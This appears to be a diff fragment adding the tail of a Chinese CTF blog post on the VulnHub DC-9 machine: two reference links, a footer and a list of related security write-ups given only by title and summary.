+<li>VulnHub DC-9: <a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></li>
+<li>Knockd 文档: <a href="https://linux.die.net/man/1/knockd">https://linux.die.net/man/1/knockd</a></li>
+</ul>
+</div></div></div><footer class="article-end shell"><div><span>写于 2026/10/08</span><p>感谢你把时间留在这里。</p></div><a href="/fuguang-notes/category/tech/">继续浏览「技术」<span aria-hidden="true">↗</span></a></footer></article><section class="related-posts shell section-space"><header class="simple-heading"><span>NEXT READING</span><h2>同一条线上的记录</h2></header><div><a class="post-row" href="/fuguang-notes/posts/ctfshow-web-recon/" style="--row-accent:#3ecf8e"><span class="post-index">01</span><div class="post-row-main"><div class="post-row-meta"><span>技术</span><time datetime="2026-10-11T00:00:00.000Z">2026/10/11</time></div><h3>CTFshow Web 信息收集复盘（WEB1–WEB20）</h3><p>从 HTML 注释、响应头、robots.txt 到源码备份、.git/.svn、phpinfo 与数据库文件，把二十道信息收集题的发现路径和判断依据整理成一份可复用的检查清单。</p></div><span class="post-row-time">27 min</span><span class="post-row-arrow" aria-hidden="true">↗</span></a><a class="post-row" href="/fuguang-notes/posts/vulnhub-ionic-defibrillator/" style="--row-accent:#3ecf8e"><span class="post-index">02</span><div class="post-row-main"><div class="post-row-meta"><span>技术</span><time datetime="2026-10-09T00:00:00.000Z">2026/10/09</time></div><h3>VulnHub Ionic Defibrillator 渗透记录：从 FTP 匿名到 sudo 提权</h3><p>一台 Rick and Morty 主题的中级靶机：FTP 匿名、robots.txt 与 cgi-bin、Cockpit、两个后门端口、SSH 爆破，再靠一个 safe 二进制和自制字典拿满九个 Flag。</p></div><span class="post-row-time">6 min</span><span class="post-row-arrow" aria-hidden="true">↗</span></a><a class="post-row" href="/fuguang-notes/posts/litctf-widebyte-sqli/" style="--row-accent:#3ecf8e"><span class="post-index">03</span><div class="post-row-main"><div class="post-row-meta"><span>技术</span><time datetime="2026-07-28T00:00:00.000Z">2026/07/28</time></div><h3>一次宽字节注入的完整复盘：从字符串型判断到 UNION 绕过</h3><p>LitCTF 的一道 EasySql，把判断注入类型、识别转义防御、宽字节绕过和 UNION 取数四个环节完整走了一遍。</p></div><span class="post-row-time">3 min</span><span class="post-row-arrow" aria-hidden="true">↗</span></a></div></section></main><footer class="site-footer"><div class="shell footer-grid"><div class="footer-intro"><span class="brand-mark" aria-hidden="true">浮</span><div><strong>浮光note</strong><p>安全技术、CTF 复盘与读书笔记，记录那些值得再想一遍的问题。</p></div></div><div class="footer-links"><div><strong>浏览</strong><a href="/fuguang-notes/category/tech/">技术</a><a href="/fuguang-notes/category/life/">生活</a><a href="/fuguang-notes/category/reading/">读书</a><a href="/fuguang-notes/category/gaming/">游戏</a></div><div><strong>更多</strong><a href="/fuguang-notes/archive/">文章归档</a><a href="/fuguang-notes/about/">关于作者</a><a href="/fuguang-notes/rss.xml">RSS 订阅</a><a href="mailto:theologian25@qq.com">邮件联系</a></div></div></div><div class="shell footer-bottom"><span>© 2026 Theologian25 · 愚者</span><span>认真写作，缓慢更新。</span></div></footer></body></html>
